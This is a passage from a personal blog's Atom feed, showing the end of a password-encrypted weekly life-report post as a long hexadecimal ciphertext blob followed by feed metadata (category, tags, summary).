a4c598d92144809bb9b95032aa479be8bb565e352b8a6d1d386899e7923cb71ea55a3110031f2739b46f3235b42df2a0dda6ba5974d93475c3a508228b60dbcabbc91736fa941d62d670dbef05a9a4ded06b8cbead672f90e269920a2ec5b056f10896cc001d0c99b31349a80d249d5cb56c4ece4ef3343e6f115e1163c5128353402cc87b1a47bb7bb618d3545715a2d6fdf476cf777913b3350c43ed510b2a3e2599c668f9cac5f6f1d2bf4076313b36cbc58a105e1358549e75981b6c6e6a3d129175827a6b0c504d1817ccb5fead7a7b8221a3c344fe8a44625e9ca0b62c6bf8559692fdfca02b0e3658c80805a2bba0dafb6d40d0dd5c87eea6e8fcbdf079cb3f1a8e05c67f3a9ef8e8aa0043ba40dd4124a13bf646c05e2972194cb3d2bdeb2793769c73a74da17f8f9e6f5c48aba0028413638fc9fa700e71d85c26bc2a2f72a8b065127eea415b0fabb468365cd03079f6ef24750539293520c0a10f2f74f4c72ab746845306a6b70936d08b81b55da0bcf851d67df64eeaed8e110fe04f2b90712cb48f7827f4c7f97275b8f52e4c27ebb0072d4a666bd350cc0c1a0545735a71618a71d3f40491cdf87caee73992ec3028979d4cb482aceabcc5e87a1dbe1b8542acccf08dc635402726cb5e6d108ef9e8870deecf5d36218ba58cde90fef4cadb2b7d1957abcc6cd47b6e42a1ac89e54570ab9cc37127bb08165961ddc4856ae887a04f1c0ee39a55a8d07af6d524d8b2c19c43f97b3a8164a36fe5caea264cc334ed2a96dae278d2b0a648fda1799afc4a04a4d6b09383b98a6a6752d0a2fc82dd6c608b5ab232dc563924c368111c832d2298db59f38b24d618f715f70d70f2386f97c096bfbb13d5ec802fe5a29679184fc06093fbf1cd561bea3b27d6ea0dcaabc80278aacadb4bde752925917462a24ea724f7d45ed0a9d964bb75f44d86a1fbe5c9f6a155219f68ac8595aedd5186353eb1ffbb475a5dbc282488047aa20a180eca270ae9a98262c0a3ce2fa402b7c0df777027d597c391e299bbf31f0759d570544bfe56af17aae2671eb71d153f8619f1fd6b7fe0600d6fa96e5c704d8730fee7d718737a6c12e741784d8519a2e2e7d89908c7bf9be755e930d15f9fa637b2a1d981262a4c4760fa00b10ad3f25fa5eab52e7951100fd745c672493020cf8309cb9deef770cd60fffad6313203aa332aa51069f1b19765a0a4bc2bd73ce76def3505debdb9f4375e42c1f3e13f32a22a3bdcbe8e846f0845fe3c761b5d922f4c4eb758cfcbbcec7e676cf7cba3cd73775005b6d7ce84832fd79ea0dd1b7c12e96bef6adafb9156ec7b6b6594d2b9b3e9be717332de814d2fe62e42065fe3cf2e80c777426b5d82327f3936a0a67235cfaeb01b67f4ec535286599ad8ce8b12e8bc7a6a9b4e539ffbcc255a3e9ec3e02431946db960fc1482473c8fadc76dfd3081d1fbd2af4f9dd9b8e3c7fc484e0e76145e1ede7a916671f812afdd53be67035fe41170e3c6007a1317d336b7e114e2d25ec355c087eb4e139af0a77213bdc8896dc056be69c5feab2dc1919def5197bd1e69bb1e46e6507c12fff3b1e18d767f9ec5a9b136d1565aba4f290a847e5004e9bf9b617fdc6f14e22dc84eccc4c8731b29feaa75823470778b070678da68ebcb02b555e16e7df22eae1131c5627c72dffdf9c15b7461cce8bf9d9f6715e69a2b297b3ef16b1240e77624613e1cc9d2d3b7586ea12a3381ba2cf72c1256a69f7b84258879a4544f3c5e71f7c909ec6e2cba3b1348436be33001076ba0b704416973fda637b2e2a1001582e2fbfbc059cf94539c760ef0031035e14a96e6976be1fa8898b707e14ae2cb5fa71c4101f654e65bbc02693451f5f91bdd17e8795292c07124d70764c2681cd1bc87cb6babdaf8e2d42e8891f14b5d5684d8e45b05fad6d133f93ce41339a2e90b6c31ee7ccd42306c79b30fdb424b2dce947963fc3d1ba72e425ab77502b46b97a1dad5b0b2fe3dafa66df995e64451bc77c6bfdc81ceca5702c65312dee9c68bccd38ed5f35e5273b5a3a3fa93cd61986dd18d2717e50015e50d5046052b018d50eb0898ad78b5df5e60cbb83fa314bd87ca60f79ccf3ab94ef5c35a4613267858273ac7f0424ad54398f5a1c6c12f489ad7aa0a6f5d353f6a0b291aa0a4b20b3b2a2e346ff3ccb79151f26e222d7520e0ac5365e7a10493a3c4c22d7a48230df0fee45004f91401e163181d2507acb9bb3f075093d96193cffce727ad026a2689998fa0c77a5a6dc6d2a10a7d007c325706dd6ef674003c83dc802c2033dd19c510f541acc7dd4e01385a377a2dd06769cbfc384297e260040dc82d904157ba0d569b42bb8c38145c065623ad30d9953615b71215a53190dbb93d1104faedaa5ffd338d8ba52c11ddabf217f1c28bf8135a8c00d9d2c00a9aa09f0c5be3692545c8d2c0fda30c503a94f633c56e989367ddabf8a4aedbda17e4676f40deb464e8cd1345cdaa4a17bb5f987470b7e4d1a9803a544e0ef8924cf2cdae6f8a8395116ad10c970500fac7e9d4f2327af47940a05b42dce9c6e0448e77b8902d893c797a363926176cefd8fd688f8428f2f7958079d7e234b16e824113317e5b8248db3fb9dead84fb915f5a196fb744c1628706f9073351caa8c36315a4a8e527f4905bfff636c6caecf2c02e35db50bac22404fe213a4c9b50d233347930fe7bd1df5b99827e478afdb0a67809934cd9b7129f868d1b3f6c5dab2f8ea66730c8b97deeeb11baef25ddf63de23fa051b76bf0aaf0470edbc9b2a815bd6bf339397646dffb9df8ab41a068001f829cfa440c3b5b163b948720dd599c69d33eff55ed28b3f4caf1404fd0dc01c29c90c6ba477634feb092bd76b8e70c98dbbc038c4997536003cf41afab766e2b31b27d0d91ff92d00d8792cf4892bedf5ac6e0ff6fdb8c2744ced3956b0fddccd8fdfc1d1773205d8f0fc79a9d5c58a5b2cb5ed5302ac70bb32af6f911edaa790bb7c646cf4c019ab5491a436c2357b8786ad9faf34b74ace2824d95f94163b8a375d7b367bbb4d645da8276b7ff174572886af0d84bb02c3810a286e9b0f90866c09ba3d02da75baa0c94d34f84f59b55fee8655e4f631087724507465d09e8536a2235a6f7ed5da6ac3aef45a3642d2ad3282ddb7bde8595884acdb03fdc7f7402afc0961c5f7c63d5487c89fdb33d669ddbd06009c0653411f514599f9431e4ae9f17eb4be283f7f64e0cbd98702533849bd2ff10cccae3b5ce918df52d6cf20dea8c02bdb701243f4ee963c7101e2d8e8fc22e9ccbcf107920b23e6ae1ab5d84bf6210c2c42ef4c9bfb71de1975c48a0a0e7c17806ba78b1cfff6270864aae369413931e3dc68831bc2bc044faeb0f8a7fd73f6578cdc418d4f11eaaad0223174711b42b125e1a0582788fe5bc38f2326596f3f21312b0031661794f9e7ca41d19337714310c162b4bf6de14d4d0222c0a2b6db2fac2d0e280e6d894d0f71a32e683e0b0d168b99673af1c54046c9187d6addce0c78d85745bc877f3c0fbb63cb2a7ab5077126ad3a16d2cd18db84e91070a87915743f155c483da0fbd1958dccdd27ba11b664386fb62dfaa934521c94f343f64c64373e887f29fa469d2de685e9205d44ea8983bc4088ce1d456d93111c77159722b89d6e2c5da08fa77ad0141725638e83a91a6da32cd4159976da69a4f88d50b12fa13de4d36fda27cbd4332488eac8bdd04d1cd81bb2afcb58043359d54f134a0a8922933ac6d199546a9d2c1d8b7bf60bdfe4872174965de57023f4e80ea181af106ebef2c3ab8c34612856a0467fddb762eaaae696000082d4f32082ec03754b39663ff8b5749fcd40e3072b2eddd1b2519e5c34e5cfbccd92420450f99ad599fedea9c4cd45e2231e7d3c8f31131680526345ca0222274462cf4e500262d833197cfaad4b82bc03249e7d7691ac04ffbd796a2bfe2b824a46fab54fc06b1daaaafe7ce1cd86600f95e6a54dc0cf23d7894c69e23eff34818938d24538e963ad03f69277b2b29aaad1dc5d428cf8fff90ebe3b0b8b50e9b262a3a87103cd003ec6d2da5daf960e5c69e78fcc02e98ad11ab643a3092d0be253ce2c6ac9a0ceee8d1a6153c929ffd5a097b75e0d7b0bae90d1b45e72279cddc58411a4d156656a7bcb03643fc1b2a9ed89773caf062f28da1885b560669e721b8601646bc6da8ce00c599325dac920f6385a386c899f30c89c482bdb8e409e667eece1047a5a64d73357945e408106f29dddbf6d1d4f063f75e9aad46d8420b9d1ad532a90dc6cf21ab5fa8040a5f461b35cd946c4b3886c8f57d4d9a8746aab901677c689817ece82ad60f395b8092d5e4d532bec15b23137e3ebce6baefbe9be13216df057e4df12d203facf355abacc5528f62b90833aa5dcf9bf556cb6208b497427e42fd0984a542f66ec3780e7d039414d1fa256c14649834f652a7a8454a66466f12cb2b71fe25b77b98e689e588c5e0d83f23cc1dccb85a55fb4f30335ec2ea5b7216e6b1a34be67d92bb84c1adc6e23da711d8a0bb275e5467f3179d80b596eeb7321d1cbec397144e5a52a07a4ad07dd55b63e51d2c9a900fdb15098c01e973acae09e1a397b9449da5d06ce9438297441d5aac6eb1e927fd89e93e948d2ed0a6ffeb611c23cbe1456d385e89b94b9f912f6be23b73f3d5b3655e43685424bee7dd9b287b98c436d3a3765ab38b827aa7013edb4389fd321cb65e69439bcefa54ab5178847d8af9c1fbc0e5be60c0664e2844ee71fd806bbdaa36fb77d4f79ec58d711beda2dc3a3be9f331be0acb3110babb2c0f734db85411549774221051676f40ce15161c9ca395f81ac2bc8d2ce1194b070416b85fe75f7f41338600f5c190ceba824c8038f0cccb0c14d7921a8c0b25d5e1f450825ce5399e1611eb06e4494967f482c3a71fd4f8ec49502a3e75a3fcf75b9206e41d2b2e93dec7defc5436736cf102c0d12c7043625f589584413ea29ce3a4d72e9fe695b0b3a1a6cced2ab3158223362b482e931cab55d9f61f88ae041403ef49dba693d97f5e15f3de8f77097696a075b9881d10510b2edd3972434933cac1964ab1c4b23f25a24c625b5935e0af9b505cc17bdd4a65bbb631b7e1ccd70375c765dd2db270584c9a70cb5bf3b05943a53d12d57bdd82c98e521367bc89d2e1cc44f5bb171650988884f20cf11e686e571338a1a418c9f5b2ad4b8ed764c5d868fdd5554313d48b5ac3c7e43ef5b5e1937f3b6f465af1323c8779a9ee58a4f3377ceebce5162de179e298fad69922e020a74afdebcdfaad6c43c9ebe420a2119da5ce979992745c05c9088e814fec15edc57f1bba853290961586d88e47fca04e4c1a9a1be90e118e64609e1ad1206c4aa811a4f0d6a4046eb60312eb9819bfe0327ec3d7e4bf3a45c09064b723552ca0de1308fb6009afb666eadb9eb67a24a8a2151fd2b5de827eef89bf7ddbb6892b1676147147fb23c81b2ca680a4b839ffad2e2d63eac0f5f973d1b0a3fcf24503db45c17cee1dccc29396e78f61f36ac29d0bea82022bc3e73cc4784ef5a72c8f14ce48d8764126f95bbb29cb03559a24214b9870f427d2c53566cb06b1988241a296a12e8bd5347e01814cdb0739d752c3a58e478e5f126e7dce9c37875ddfb66a6ed9a2ad1e3ee460ae01158001843cb33c8bb938abbbb396ff1d3e2dfd687b78982da24454596af6164f691d91f502dd4fb85e66fa54c7e5ac14740c1f83b491bc3d46f677782f48bc29922dc697328d61f106f44414898a9bf7eef65fe40691ea17cee7f72e76860fccebe41e9d4972cfa1f6d71abeac7e1cffd7f297f7244f2b9faa5577884b345dd4477e2874e7b669be0d462c068b37c6d2dee93b37dad3dbb23cfcb3e1860e184bc399e5d8c445c85be11268dd4fa6d15892e1499add07dcb44e259a10e4803ebbfdfcc57c1046391e42b8cc259e0cf291f6c55e8b2662ac80790de6e99220dbe7aec3787a6b98af05d093aa74ad9903528393a9c74b404fe8764968fd1a26309a2a632d6c30a8fd050105eb6fd4ce82b7c434c9ed1872c317d1134475ad97ec13e2001be1496830b58da42e4704b6602df15a15509565feb9d4ec06b8d85e369beb81127aa01b1b687cf6dd4459d6c25e30932bd0de6c4920520bf5c797dce8a4ddad6b3432aefe7a547a92981deff303155ab4cc08e9160bb112b83dccde92bad7342100a54a9494e0377aee12a587d808f7dff08c6ebc8b6e158cda3b81937259eed41b0306d3ff04db28bdf93732c401ef0fba469e36d92f72db3cb79a5cb0cdf1cdf0a9feb3cae2e04a10ce7696aad29dc6b0868afed871c6a8bd04b89b5eb5e9e6df23141ce4d62ef6b2648ae7a5e5869036aba500041a2f28d86f045c02cf803967c832391d064b198dbf8d61c25caf137384941c550bb070681727f0da5e7956163bf33990f2609050c94074fe650e685fcefe610808ba55b9e894ab1e62c9c36257076680f90c491a535c7d8d8429de4f510b77766e4a32ceaa3915f374bf99e7ad5e22736194e318502fd54db428da725438fd8f325f707d99d8470288b9aa65a1b3f9bf37eeadeba188c6300636311ef9075ef46d04a037290774527a98ea3285008fcdea71aa04bd7d2c3eaf1a5c9d691996d7b69ec5033c9adaf7e9bf66c979b7797755d90fc14ad2c0ded09253e3bfe7286bb2c586816982146f316edbd8dcf93845b17dbeb420b2602e0ac2ee5b1e09e492d7b4f2c1e6088451fd77413825b8422148eda896a12518216297ad64682ee90da6c2aaff0e5c49a80d7e1acceb076ee6889a4b1c4a31370dc91d553c7d1167f959974750d617b0393fa2cd80767362f9764959d749787426794d902c9307a4b482c606e972ac549de3363f9f822aa051eb2dca362a5ffe53d201542002b04e9130c0918e4ff3a08f3e4e5bed671809cbcdc14e600908da6a4658fc6de31bca53cb779e755d626961a3528103a6b9ac7832cfb1b37dbccbdf806d5bc3fdee3f9987f83999654978d126262a53c748cc67217dfd6ec45325db253f0de9c5a24e45e368b51ac6104da45b2d0ca1f2f452903d85e9c5305977c62cd5a2f836999026247e6eec1dd05008363a7d49f0b29291f5995533f39f96b7b90b2ec6d36f5da3bb513e6d94ebfded0ca03a46f0ff34368d22b172e094ffed234d21790c7d63e6ad2c7dc695dc3769a0dfce08364bfab4698dca57be9b157307626b5cce949a8548f1c3dd2f66d414056e820a3193a19f681a759fc674702168b3e9c918f140894e345496f1c741b35055a96227098ba190c78325fbddf0a780b731ae48a5321c8bcd25d2bfd35e7ffc6b246178c89fae7ffe45b485a21a978cd8e909b637e8cbe26de5aabd1629c42a910e5940b63eef57a290a5fc78fa00abc9cdd894cc921f2c465d24c462118609bf282e7b8c7878d4abc427803a238a55ff77ab813ab0acc2fa7cc58a77908ddbf15f508e9f9a8d05afe28b726d1b8509d6e087a17dc095f98ca05780dd6bb85e9e78337702f341e0d25e2147894426daa9f0ce24bc8d34365ac82c7d688948a2462fb93dccc5c9fa7873f3b977b2b774997e220c024ceb1e52658354983c50613311491ed7381f379aceb16785f5635183e604f31f270d593334cf02874b527263cc754a034d153e32968aa6a1394b93584a9a460dc1b3ce7b7cd3f8accd13024bb7f3c3c733c74916be72c16bfc01e91a92df8da456e61417f72c87bd8cef11f598310e3fce042f28f089cb57d6b38771f1b03aae5967dd2efd6d22fd2e4cc87a46ce3682007c4c011ba5169f54a3cdcb2c2bafe5b130edbcefa5176d6da4d884a0be3d271de455acf8b0fd18e695e308c42bef0675da06ed9a48c8e6327b07108b72187fc57181b11264b258582dbcdf44c3131e0c0b0e16b900797b63cd897a991912691b428af71dc5ae83796225c133d6e3062b49de85c08df7f1e3fe176900fab1ed86898d268c772fcb531e9cc48995ad62624dcca208d2da3f92111391cb60d84eee61f048bbe22617e1cf69c5fd093cd77d25c3e8e48a7cec3803c92dec1f2c61531059b327c74b4fce7969f2f938726bc679252c6edb038c247a3bbc3bce74400624bf7f2e079c1086f05e19b30f015b400d4f627fd4e301c0cfa0280d762782fedbc09a6781b76ce4885bf90958f45f6cd0529fd35c5f80500bb7f5bb5603042d18cb8be5dd7a6302e27e8c5609c39c72318b3c0e4d15d46f52842caebb0daa810852dc3d3fd82ae790c08a578173504eaaaa52e75f9f713e70a8d92b4f8304f49a90ded563c277c86e026c84046b3588c4e2f3d2828acf3772a9ca4b871e12e53c47c4104a75d8bd1c9f2531cb0360f5a0ecefbfae00f7672669a3311a6a32281b8b78ea372edeb35ff6bc70c02bde6c5d2d781c1bcbb714e9e3de8b4243ac586235bdaea4cf85027035b80ade7f58d19f91b02783234f1dad5e21f1f3bf6d0b0693416234813c58270d73340ba07477ddf79a2895befb631ee4d3a204bcd0b85a75fb4b23b8d84976b7edf741866848008687dbe049c47043d2f07b910d5fe1471b23d70a53c9d11bc35e7</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
    <category term="生活周报" scheme="https://www.blog.hackerjerry.top/tags/%E7%94%9F%E6%B4%BB%E5%91%A8%E6%8A%A5/"/>
    
  </entry>
  
</feed>
